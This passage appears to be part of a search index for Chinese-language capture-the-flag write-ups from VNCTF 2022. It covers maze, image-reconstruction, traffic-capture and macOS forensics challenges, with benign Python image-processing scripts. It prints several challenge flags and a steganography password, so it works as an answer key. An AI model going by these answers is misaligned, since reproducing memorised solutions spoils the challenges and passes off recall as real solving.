ssssddssaassddddwwwwddwwddddddwwddddddssddwwddddddddssssaawwaassaassaassddssaassaawwwwwwaaaaaaaassaassddddwwddssddssssaassddssssaaaaaawwddwwaawwwwaassssssssssssddddssddssddddddddwwaaaaaawwwwddssddwwwwwwwwddssddssssssssddddss VNCTF{801f190737434100e7d2790bd5b0732e}","title":"BabyMaze"},{"location":"writeups/vnctf2022/#_1","text":"\u9898\u76ee \u5f88\u660e\u663e\u80fd\u53d1\u73b0\u6709\u50cf\u7d20\u683c\u70b9\uff0c\u5e76\u4e14\u6709\u4e00\u4e9b\u989c\u8272\u4e0d\u4e00\u6837\uff0c\u53ef\u80fd\u662f flag \u4e8e\u662f\u6253\u7b97\u63d0\u53d6\u51fa\u6240\u6709\u683c\u70b9\uff0c\u4f46\u662f\u597d\u50cf\u662f\u5206\u5757\u7684\uff0c\u4e0d\u80fd\u4e00\u6b21\u6027\u5b8c\u6574\u63d0\u53d6 \u4e8e\u662f\u5c31\u8089\u773c\u786c\u770b\uff0c\u5f97\u5230 flag\uff1a vnctf{34aE@w} \u770b\u4e86 wp\uff0c\u662f\u7f29\u653e\u5927\u5c0f\u91cd\u65b0\u91c7\u6837\uff1a from PIL import Image img = Image . open ( \"flag.png\" ) img = img . resize (( 79 , 71 ), Image . NEAREST ) img . show () \u5c31\u80fd\u6e05\u6670\u770b\u5230 flag \u4e86","title":"\u4ed4\u7ec6\u627e\u627e"},{"location":"writeups/vnctf2022/#strange-flag","text":"\u4e00\u4e2a\u6d41\u91cf\u5305\uff0cwireshark \u6253\u5f00\uff0c\u8ffd\u8e2a\u6700\u540e\u4e00\u4e2a TCP \u6d41 \u8bfb\u4e00\u4e0b\u8bf7\u6c42\uff0c\u53d1\u73b0\u662f\u8fdb\u5165\u5230\u4e86 flag \u76ee\u5f55\u4e0b\u6267\u884c\u4e86 tree \u547d\u4ee4 \u5f97\u5230\u7684 response \u662f gzip \u538b\u7f29\u540e\u7684\uff0c\u53d6\u51fa\u5185\u5bb9\uff0c\u7136\u540e\u89e3\u538b\u5f97\u5230 tree \u7684\u7ed3\u679c\uff1a flag `-- New\\ folder |-- New\\ folder | |-- New\\ folder | |-- New\\ folder\\ (2) | |-- New\\ folder\\ (3) | `-- New\\ folder\\ (4) `-- New\\ folder\\ (2) |-- New\\ Folder\\ (3) | |-- New\\ folder | | |-- New\\ folder | | | |-- New\\ folder | | | |-- New\\ folder(2) | | | | `-- New\\ folder | | | |-- New\\ folder(3) | | | | `-- New\\ folder | | | `-- New\\ folder(4) | | | `-- New\\ folder | | `-- New\\ folder(2) | | |-- New\\ folder | | |-- New\\ folder(2) | | | `-- New\\ folder | | |-- New\\ folder(3) | | | `-- New\\ folder | | `-- New\\ folder(4) | |-- New\\ folder(10) ... \u4e0d\u96be\u53d1\u73b0\uff0c\u662f\u4e00\u5806\u7a7a\u6587\u4ef6\u5939\u5f62\u6210\u7684\u7ed3\u6784 \u7136\u540e\u5c31\u56de\u60f3\u8d77\u4e86\u4e4b\u524d\u770b\u5230\u7684\u4e00\u79cd esolang \u53eb Folders\uff0c\u662f\u901a\u8fc7\u4e00\u5806\u5d4c\u5957\u7684\u7a7a\u6587\u4ef6\u5939\u7f16\u5199\u7684\uff0c\u8fd9\u4e2a\u53ef\u80fd\u5c31\u662f \u5148\u91cd\u5efa\u8d77\u8fd9\u4e2a\u76ee\u5f55\u7ed3\u6784\uff0c\u6ca1\u627e\u5230\u9006 tree \u7684\u73b0\u6210\u5de5\u5177\uff0c\u53ea\u597d\u624b\u5199\u4e00\u4e2a\u4e86\uff1a import os from pathlib import Path with open ( \"test\" , \"r\" ) as f : tree = f . readlines () path = Path ( \"flag\" ) last_level = - 1 for each in tree : level = each . find ( \"N\" ) // 4 if level < last_level : path = path . parent if level == last_level : path = path . parent diff = last_level - level for _ in range ( diff ): path = path . parent path = path / each . strip () . replace ( \" \\\\ \" , \"\" ) last_level = level os . makedirs ( path ) \u67e5\u4e86\u4e0b\uff0cFolders \u6709\u5de5\u5177\uff0cpip install Folders\uff0c\u7136\u540e Folders flag/\uff0c\u5f97\u5230 flag\uff1a vnctf{d23903879df57503879bcdf1efc141fe}","title":"Strange flag"},{"location":"writeups/vnctf2022/#prize-wheel","text":"\u5dee\u4e00\u70b9\uff0c\u6700\u540e\u7684\u56fe\u7247\u9006\u8fc7\u53bb\u7684\u601d\u8def\u5b8c\u5168\u9519\u4e86 \u9996\u5148\u7ed9\u4e86\u4e00\u4e2a exe\uff0c\u5f00\u59cb\u4e5f\u6ca1\u610f\u8bc6\u5230\u8fd9\u4e2a\u662f\u62bd\u5956\uff0c\u89c4\u5219\u4e5f\u6ca1\u770b\uff0c\u968f\u4fbf\u8dd1\u4e86\u8dd1\u5c31\u62ff\u5230\u4e86\u538b\u7f29\u5305\u5bc6\u7801 f6a623a2c577de3b46c079267d4bdd6e \u518d\u7ec6\u770b\u53d1\u73b0\u662f 0.5% \u7684\u6982\u7387\u80fd\u62bd\u5230\u5bc6\u7801\uff0c\u9884\u671f\u662f\u81ea\u52a8\u5316\u62bd\u5956\u6216\u8005\u9006\u5411\uff0c\u7ed3\u679c\u6211\u4e09\u6b21\u5c31\u62bd\u51fa\u6765\u4e86\uff1f\uff1f\uff08\u6b27\u5728\u4e86\u4e0d\u9700\u8981\u7684\u5730\u65b9.jpg\uff09 \u5145\u6ee1\u5e0c\u671b\u7684\u5f71\u50cf\uff08 \u538b\u7f29\u5305\u89e3\u5f00\u4e4b\u540e\u5f97\u5230\u53e6\u4e00\u4e2a\u56fe\u7247 \u9898\u76ee \u5f88\u660e\u663e\u5e94\u8be5\u662f\u4e00\u5f20\u56fe\u7247\u63d0\u53d6\u51fa\u4e86\u6240\u6709\u50cf\u7d20\u70b9\uff0c\u7136\u540e\u86c7\u5f62\u91cd\u65b0\u6392\u5217\u5f62\u6210\u8fd9\u5f20\u56fe\u7247 \u9898\u76ee hint \u4e5f\u8bf4\u4e86\u5b58\u5728\u53ef\u4ee5\u5b9a\u4f4d\u7684\u4e1c\u897f\uff0c\u80af\u5b9a\u662f\u90a3\u4e9b\u767d\u70b9 \u4f46\u662f\u6211\u7684\u5199\u6cd5\u600e\u4e48\u6837\u90fd\u4e0d\u4f1a\u8ba9\u8fd9\u4e9b\u5bf9\u5728\u4e00\u8d77 \u6211\u7684\u60f3\u6cd5\u662f\u86c7\u5f62\u63d0\u53d6\u51fa\u6240\u6709\u50cf\u7d20\u70b9\uff0c\u7136\u540e\u6309\u7167\u987a\u5e8f\u4ece\u4e0a\u5230\u4e0b\u4ece\u5de6\u5230\u53f3\u586b\u5165 \u6211\u7684\u5199\u6cd5 from PIL import Image from tqdm import tqdm import sys img = Image . open ( \"flag.png\" ) width , height = img . size res = Image . new ( \"RGBA\" , ( 1220 , 1220 )) lst = [] for i in range ( width // 2 + 1 ): for j in range ( i , width - i ): lst . append ( img . getpixel (( i , j ))) for j in range ( i + 1 , width - i ): lst . append ( img . getpixel (( j , width - i - 1 ))) for j in range ( width - i - 2 , i , - 1 ): lst . append ( img . getpixel (( width - i - 1 , j ))) for j in range ( width - i - 1 , i , - 1 ): lst . append ( img . getpixel (( j , i ))) lst = lst [:: - 1 ] with tqdm ( total = 600 ) as pbar : for times in range ( 600 ): ptr = 0 res = Image . new ( \"RGBA\" , ( 610 , 1221 )) for j in range ( 1220 ): for i in range ( width - times ): try : res . putpixel (( i , j ), lst [ ptr ]) ptr += 1 except : pass pbar . update ( 1 ) res . save ( f \"res/- { times } .png\" ) \u6362\u4e86\u597d\u591a\u79cd\u987a\u5e8f\uff0c\u5bfc\u51fa\u4e86\u4e00\u5343\u591a\u5f20\u56fe\u7247\u4e5f\u6ca1\u6709\u957f\u5f97\u597d\u770b\u7684 \u770b\u4e86 wp\uff0c\u77e5\u9053\u4e86\u6bcf\u4e00\u4e2a\u6b63\u65b9\u5f62\u7684\u5708\u4e0a\u90fd\u6709\u4e00\u4e2a\u767d\u8272\u7684\u70b9\uff0c\u8981\u65cb\u8f6c\u6bcf\u4e00\u5708\uff0c\u8ba9\u767d\u8272\u7684\u70b9\u5bf9\u6210\u4e00\u6761\u7ebf \u6240\u4ee5\u9700\u8981\u5199\u811a\u672c\u6765\u65cb\u8f6c\u6bcf\u4e00\u4e2a\u6b63\u65b9\u5f62\u7684\u5708\u76f4\u5230\u5bf9\u9f50\uff1a \u6b63\u89e3 from PIL import Image img = Image . open ( 'flag.png' ) width , height = img . size c_x = width // 2 c_y = height // 2 for count in range ( 3 , width + 1 , 2 ): print ( count ) d = count // 2 for i in range (( count - 1 ) * 4 ): p_x = c_x - d p_y = c_y - d tmp0 = img . getpixel (( width // 2 , c_y - count // 2 )) if tmp0 [ 0 ] == 255 and tmp0 [ 1 ] == 255 and tmp0 [ 2 ] == 255 : break tmp = img . getpixel (( p_x , p_y )) for j in range ( count - 1 ): img . putpixel (( p_x , p_y ), ( img . getpixel (( p_x + 1 , p_y )))) p_x += 1 for j in range ( count - 1 ): img . putpixel (( p_x , p_y ), ( img . getpixel (( p_x , p_y + 1 )))) p_y += 1 for j in range ( count - 1 ): img . putpixel (( p_x , p_y ), ( img . getpixel (( p_x - 1 , p_y )))) p_x -= 1 for j in range ( count - 2 ): img . putpixel (( p_x , p_y ), ( img . getpixel (( p_x , p_y - 1 )))) p_y -= 1 img . putpixel (( p_x , p_y ), tmp ) img . save ( \"trueflag.png\" )","title":"prize wheel"},{"location":"writeups/vnctf2022/#simple-macos","text":"\u4e5f\u662f\u5dee\u4e00\u70b9\uff0c\u770b\u9519\u9690\u5199\u7684\u56fe\u7247\u6587\u4ef6\u4e86\uff0c\u505a\u4e86\u534a\u5929\u505a\u4e0d\u51fa\u6765 macOS \u53d6\u8bc1\uff0c\u7ed9\u7684\u538b\u7f29\u5305\u662f System \u548c Users \u6587\u4ef6\u5939\u7684\u4e00\u90e8\u5206 \u5168\u5c40\u641c\u7d22 flag\uff0c\u53d1\u73b0 /Users/scr1pt/Librarys/Mail/V9/.../[Gmail].mbox/\u5df2\u5220\u9664\u90ae\u4ef6.mbox/ \u4e2d\u6709\u4e00\u4e2a 603.emlx \u6587\u4ef6\uff0c\u662f\u4e00\u5c01\u5220\u9664\u6389\u7684\u90ae\u4ef6 \u7528 mac \u90ae\u4ef6\u5ba2\u6237\u7aef\u5c31\u80fd\u76f4\u63a5\u6253\u5f00\uff1a \u7136\u540e\u53bb\u627e\u8bf4\u7684 profile picture\uff0c\u53d1\u73b0\u6709\u4e09\u4e2a\u6587\u4ef6\u91cc\u6709\u7c7b\u4f3c\u56fe\u7247\u7684 base64: /System/Volumes/Preboot/79FABCCE-3636-4266-A6CF-8E3BB40332B4/var/db/CryptoUserInfo.plist /System/Volumes/Preboot/79FABCCE-3636-4266-A6CF-8E3BB40332B4/System/Library/Caches/com.apple.corestorage/EncryptedRoot.plist.wipekey /System/Volumes/Preboot/79FABCCE-3636-4266-A6CF-8E3BB40332B4/var/db/AllUsersInfo.plist \u7b2c\u4e00\u4e2a\u662f\u82b1\u56ed\u5b9d\u5b9d\u7684\u4e00\u4e2a\u89d2\u8272 jpeg \u56fe\u7247\uff0c\u7b2c\u4e8c\u4e2a\u662f\u4e00\u6735\u8377\u82b1\u7684 tiff \u56fe\u7247\uff0c\u7b2c\u4e09\u4e2a\u662f\u4e00\u4e2a\u538b\u7f29\u5305\uff0c\u89e3\u538b\u4e4b\u540e\u6709\u4e00\u5806\u8377\u82b1\u56fe\u7247\u7684\u4e0d\u540c\u6837\u5f0f\uff08\u5927\u5c0f\u8fb9\u6846\u6587\u5b57\u4e4b\u7c7b\uff09 \u7136\u540e\u6211\u5c31\u53bb\u770b\u90a3\u4e2a tiff \u4e86\uff0c\u4ec0\u4e48\u90fd\u770b\u4e0d\u51fa\u6765 \u770b\u4e86 wp\uff0c\u662f\u5728\u7b2c\u4e00\u4e2a\u56fe\u7247\u4e2d\u9690\u85cf\u7684\u4fe1\u606f \u6587\u4ef6\u672b\u5c3e\u6709\u4e00\u4e32 flag \u7684\u7ed3\u5c3e nsllc_1s_s1MMple} \uff08\u4e0d\u592a\u786e\u5b9a\uff09 \u7136\u540e\u518d\u53bb\u6389\u8fd9\u4e00\u4e32\uff0c\u653e\u5230 Our Secret \u4e2d\u8bfb\u53d6\uff0c\u5f31\u5bc6\u7801 123456\uff0c\u5f97\u5230\u524d\u534a\u90e8\u5206 flag: VNCTF{Macos_Fore","title":"simple macos"}]}